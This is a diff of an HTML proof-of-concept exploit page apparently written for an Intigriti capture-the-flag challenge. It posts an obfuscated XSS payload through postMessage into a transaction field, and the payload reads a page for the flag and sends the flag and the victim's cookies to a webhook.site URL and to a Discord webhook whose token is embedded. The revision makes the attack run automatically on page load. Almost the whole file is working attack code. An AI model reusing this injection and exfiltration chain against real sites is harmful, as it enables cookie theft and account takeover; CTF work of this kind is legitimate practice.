@@ -2,71 +2,59 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit POC</title>
+    <title>Intigriti Exploit</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #1a1a1a; color: #fff;">
+<body style="background-color: #1a1a1a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
 
-    <h1 style="color: #00FF88;">Exploit Ready: Dual Channel</h1>
-    <p>Exfiltration targets: Webhook.site + Discord</p>
+    <h1 style="color: #00FF88;">Exploit Loaded</h1>
+    <p>Attempting auto-execution...</p>
     
     <button onclick="execute()" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #5865F2; color: white; border: none; border-radius: 5px; font-weight: bold;">
-        LAUNCH ATTACK 🚀
+        LAUNCH MANUALLY 🚀
     </button>
     
-    <div id="log" style="margin-top: 20px; font-family: monospace; color: #ccc;">Waiting for launch...</div>
+    <div id="log" style="margin-top: 20px; font-family: monospace; color: #ccc;">Initializing...</div>
 
     <script>
-        // --- CONFIGURATION ---
         const TARGET_BASE = "https://challenge-0126.intigriti.io";
         const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
         const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
         
-        // 1. Webhook.site
         const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
-        
-        // 2. Discord Webhook
         const DISCORD_URL = "https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0";
 
         function log(msg) {
             document.getElementById("log").innerText = msg;
-            console.log(msg);
         }
 
-        // --- THE PAYLOAD (Runs on Admin's browser) ---
         const exfilScript = `
             var hookSite = "${WEBHOOK_URL}";
             var discordHook = "${DISCORD_URL}";
 
-            // Helper: Send to Discord via Beacon (CORS Bypass attempt)
             function sendToDiscord(content) {
                 var data = JSON.stringify({
                     username: "Flag Stealer",
                     content: "🚩 **FLAG CAPTURED:** " + content
                 });
-                // Send as Blob to force correct Content-Type for Discord
                 var blob = new Blob([data], { type: 'application/json' });
                 navigator.sendBeacon(discordHook, blob);
             }
 
-            // Step 1: Steal Data
             fetch('/checkout.html')
             .then(r => r.text())
             .then(html => {
-                // Extract flag content
                 var flag = "FLAG_NOT_FOUND";
                 if(html.indexOf("FLAG:") > -1) {
                     var start = html.indexOf("FLAG:");
-                    flag = html.substring(start, start + 60); // Grab chars around FLAG:
+                    flag = html.substring(start, start + 60);
                 }
                 var cookies = document.cookie;
                 
-                // CHANNEL 1: Send to Webhook.site (Reliable)
                 var payload = new FormData();
                 payload.append('flag', flag);
                 payload.append('cookie', cookies);
                 navigator.sendBeacon(hookSite + "?type=data", payload);
 
-                // CHANNEL 2: Send to Discord
                 sendToDiscord(flag + "\\n\\n🍪 Cookie: " + cookies);
             })
             .catch(e => {
@@ -74,20 +62,21 @@
             });
         `;
 
-        // Encode payload
         const base64Exfil = btoa(exfilScript);
-        
-        // The Injection (Bypasses title tag + runs payload)
         const xssPayload = `0x"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
 
-        // --- EXECUTION LOOP ---
         function execute() {
             log("Opening target window...");
+            
             let win = window.open(CHECKOUT_URL, "targetWindow");
 
-            // Wait 3.5s for page load
+            if (!win) {
+                log("Popup blocked! Click the button above.");
+                return;
+            }
+
             setTimeout(() => {
-                log("Spamming payloads (BTC, XMR, 1337COIN)...");
+                log("Spamming payloads...");
 
                 const currencies = ["1337COIN", "BTC", "XMR"];
                 let attempts = 0;
@@ -96,29 +85,31 @@
                     attempts++;
                     let curr = currencies[attempts % currencies.length];
 
-                    // Send Malicious Transaction
-                    win.postMessage({
-                        type: "submitTransaction",
-                        transaction: {
-                            currency: curr,
-                            amount: 1337,
-                            toAddress: xssPayload
-                        }
-                    }, "*");
+                    try {
+                        win.postMessage({
+                            type: "submitTransaction",
+                            transaction: {
+                                currency: curr,
+                                amount: 1337,
+                                toAddress: xssPayload
+                            }
+                        }, "*");
+                    } catch(e) { console.log(e); }
 
                     if (attempts % 5 === 0) log(`Sent ${attempts} payloads...`);
 
-                    // Stop after 20 attempts and trigger XSS
                     if (attempts > 20) {
                         clearInterval(interval);
-                        log("REDIRECTING Admin to MarketWatch...");
+                        log("REDIRECTING Admin...");
                         win.location.href = MARKETWATCH_URL;
-                        log("Exploit finished. Check Discord!");
+                        log("Exploit finished.");
                     }
                 }, 500);
 
             }, 3500);
         }
+
+        window.onload = execute;
     </script>
 </body>
 </html>
